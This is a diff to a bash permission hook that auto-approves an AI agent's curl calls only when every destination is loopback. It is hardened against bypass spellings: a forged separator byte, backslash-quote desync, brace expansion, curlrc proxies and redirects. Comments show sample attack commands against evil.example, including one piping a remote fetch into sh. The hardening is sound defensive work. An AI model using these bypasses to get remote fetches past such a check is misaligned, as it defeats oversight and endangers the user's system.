@@ -28,11 +28,26 @@
 # prompt.
 #
 # Residual, accepted: a listener on a loopback port can relay to anywhere, so
-# "loopback" bounds the destination address, not the ultimate destination. This
-# grants no new reach — `Bash(python3:*)` is already in `allow` and can open the
-# same socket — and the same relay channel is documented for the nono sandbox
-# (`open_port: [0]`, dot_config/nono/CLAUDE.md).
+# "loopback" bounds the destination address, not the ultimate destination. The
+# same bound is the reason `-o` / `--dump-header` / `>` are not restricted here:
+# the *content* written comes from that listener and the *path* is arbitrary, so
+# this hook bounds the destination address and not the side effects. Both grant
+# no new reach — `Bash(python3:*)` is already in `allow` and can open the same
+# socket and write the same files — and the relay channel is documented for the
+# nono sandbox as well (`open_port: [0]`, dot_config/nono/CLAUDE.md).
+#
+# Residual, accepted: pathname globbing (`curl -H * http://localhost/`) can
+# change the argument count after this walk has read it, so a file planted in
+# the working directory can become a curl argument. Brace expansion, which needs
+# no filesystem at all, is refused below; pathname globs are left because the
+# same "no new reach" argument applies and because refusing `*`, `?` and `[`
+# outright would take query strings and the `[::1]` authority form with them.
 set -euo pipefail
+
+# The tokenizer marks command separators with a byte no command writes on
+# purpose. It is declared here because the readability checks below have to
+# refuse it in the input before the walk can rely on it being its own.
+SEP=$'\x01'
 
 emit_allow() {
     printf '%s\n' '{"hookSpecificOutput":{"hookEventName":"PreToolUse","permissionDecision":"allow","permissionDecisionReason":"curl-localhost-guard: 宛先がすべてループバック(localhost / 127.0.0.0/8 / [::1])なので承認不要で実行します。"}}'
@@ -50,12 +65,41 @@ case "$COMMAND" in
 *) exit 0 ;;
 esac
 
+# The walk below is quadratic in the length of the command, and `matcher:
+# "Bash"` runs this hook for every Bash call — including ones that merely
+# mention curl in a long quoted body (`gh pr create --body …`, and the PR
+# describing this very hook is that shape). An over-long command is also just
+# another command that cannot be read cheaply, so it takes the same exit as any
+# other unreadable one.
+[[ ${#COMMAND} -gt 8192 ]] && exit 0
+
 # A variable or a command substitution can carry the real target, and an
 # assignment prefix can set `http_proxy` and redirect an otherwise-loopback URL
-# off the machine. Neither is readable here, so neither is allowed.
+# off the machine. Neither is readable here, so neither is allowed. The SEP
+# sentinel is refused for a different reason: written literally in the command
+# it would forge a segment boundary the shell does not have, so `curl URL <SEP>
+# echo https://evil.example/` would read as an inert `echo` segment while bash
+# passes the remote URL to curl.
 case "$COMMAND" in
-*'$'* | *'`'*) exit 0 ;;
+*'$'* | *'`'* | *"$SEP"*) exit 0 ;;
 esac
+
+# curl reads a curlrc before it looks at any argument, and one `proxy = …` line
+# in it sends a loopback URL to an arbitrary host — the same capability
+# `--resolve` / `--connect-to` / `-x` are refused for below, with no spelling in
+# the command for this hook to see. curl takes the first of these that exists.
+# Nothing in this repository manages a curlrc, so bailing costs nothing in
+# practice. (`http_proxy` in the environment is the same class and is not
+# checkable at all: the hook's environment is not the Bash tool's.)
+# An `if` rather than `[[ … ]] && exit 0`: a false test on the last iteration
+# would make the loop itself return non-zero, and `set -e` would then end the
+# hook with exit 1 — an error status, not the silent fall-through this wants.
+for rc in "${CURL_HOME:-}/.curlrc" "${XDG_CONFIG_HOME:-}/curlrc" "${HOME:-}/.curlrc"; do
+    case "$rc" in /.curlrc | /curlrc) continue ;; esac
+    if [[ -e "$rc" || -L "$rc" ]]; then
+        exit 0
+    fi
+done
 
 # --- tokenizer ---------------------------------------------------------------
 
@@ -72,8 +116,10 @@ esac
 # subshell parentheses) become the SEP sentinel; redirections become one
 # operator token with any file-descriptor digit attached, so `2>&1` cannot leave
 # a stray `1` behind for the argument walk to read as a URL.
-SEP=$'\x01'
 TOKENS=()
+
+# Set when the walk reads something whose argument count it cannot predict.
+UNREADABLE=0
 
 tokenize() {
     local s=$1
@@ -92,6 +138,34 @@ tokenize() {
         character=${s:index:1}
 
         if [[ -n "$quote" ]]; then
+            # Inside "..." a backslash still escapes `"` and `\`, and still
+            # continues a line. Treating it as an ordinary character is what
+            # desynchronizes this walk from bash: in `-H "A\"B"` the shell reads
+            # that middle quote as text, but a literal-backslash walk lets it
+            # CLOSE the string — and then the following `"` OPENS one the shell
+            # is not in. From there every space, `|` and `;` is swallowed into a
+            # single token, so `… "A\"B" https://evil.example/ | sh` reads as one
+            # harmless argument. The desync reverses on every second `\"`, so
+            # "the walk only ever splits more than bash" is not a safe intuition.
+            # `\$` and `` \` `` cannot appear: both were refused above.
+            if [[ "$quote" == '"' ]]; then
+                case "$character" in
+                \\)
+                    case "${s:index+1:1}" in
+                    '"' | \\)
+                        index=$((index + 1))
+                        current+=${s:index:1}
+                        started=1
+                        continue
+                        ;;
+                    $'\n')
+                        index=$((index + 1))
+                        continue
+                        ;;
+                    esac
+                    ;;
+                esac
+            fi
             if [[ "$character" == "$quote" ]]; then
                 quote=''
             else
@@ -102,6 +176,13 @@ tokenize() {
         fi
 
         case "$character" in
+        '{' | '}')
+            # Brace expansion needs no filesystem: `-d {x,https://evil.example/}`
+            # becomes two words and the second reaches curl as a URL. Only the
+            # unquoted form expands, so a JSON body in quotes is untouched.
+            UNREADABLE=1
+            return
+            ;;
         "'" | '"')
             # An empty quoted string is still a token (`-d ''`).
             quote=$character
@@ -230,8 +311,14 @@ is_loopback_url() {
 
 # Flags that take no value. Short flags may be bundled (`-fsSL`), so the bundle
 # is checked letter by letter against SAFE_SHORT_FLAGS.
-SAFE_LONG_FLAGS='--silent --show-error --verbose --include --head --location --location-trusted --insecure --fail --fail-with-body --fail-early --globoff --compressed --no-buffer --ipv4 --ipv6 --progress-bar --no-progress-meter --http1.1 --http2 --path-as-is --raw --tcp-nodelay --disable --no-keepalive --remote-name --create-dirs --get'
-SAFE_SHORT_FLAGS='sSvIiLkfgN46O#'
+# `--location` and `--location-trusted` are deliberately absent: a 3xx from the
+# loopback listener sends curl itself to wherever the redirect points, so they
+# break the one thing this hook checks. `--location-trusted` forwards the
+# credentials too. `--disable` is absent as well — it suppresses the curlrc,
+# but the hook already bails when a curlrc exists, and listing it here would
+# read as if spelling it were the defence.
+SAFE_LONG_FLAGS='--silent --show-error --verbose --include --head --insecure --fail --fail-with-body --fail-early --globoff --compressed --no-buffer --ipv4 --ipv6 --progress-bar --no-progress-meter --http1.1 --http2 --path-as-is --raw --tcp-nodelay --no-keepalive --remote-name --create-dirs --get'
+SAFE_SHORT_FLAGS='sSvIikfgN46O#'
 
 # Flags whose value is the next token and is not a URL.
 SAFE_VALUE_LONG_FLAGS='--request --header --data --data-raw --data-binary --data-urlencode --json --output --write-out --max-time --connect-timeout --retry --retry-delay --retry-max-time --user-agent --referer --cookie --cookie-jar --range --max-filesize --dump-header --form-string --oauth2-bearer --user --aws-sigv4 --http-version'
@@ -310,6 +397,11 @@ classify_curl() {
             in_list "${token%%=*}" "$SAFE_VALUE_LONG_FLAGS" || return 1
             # `-d @file` / `--data=@file` reads a local file into the body.
             case "${token#*=}" in @* | -) return 1 ;; esac
+            # `--data-urlencode` takes the file form as `name@file`, so for it
+            # the `@` is not only a prefix.
+            if [[ "${token%%=*}" == --data-urlencode ]]; then
+                case "${token#*=}" in *@*) return 1 ;; esac
+            fi
             index=$((index + 1))
             ;;
         --*)
@@ -319,6 +411,9 @@ classify_curl() {
                 value=${tokens[$((index + 1))]:-}
                 [[ -z "$value" ]] && return 1
                 case "$value" in @* | -) return 1 ;; esac
+                if [[ "$token" == --data-urlencode ]]; then
+                    case "$value" in *@*) return 1 ;; esac
+                fi
                 index=$((index + 2))
             else
                 # --proxy, --resolve, --connect-to, --next, --config,
@@ -396,6 +491,7 @@ classify_segment() {
 }
 
 tokenize "$COMMAND"
+[[ $UNREADABLE -eq 1 ]] && exit 0
 [[ ${#TOKENS[@]} -eq 0 ]] && exit 0
 
 position=0
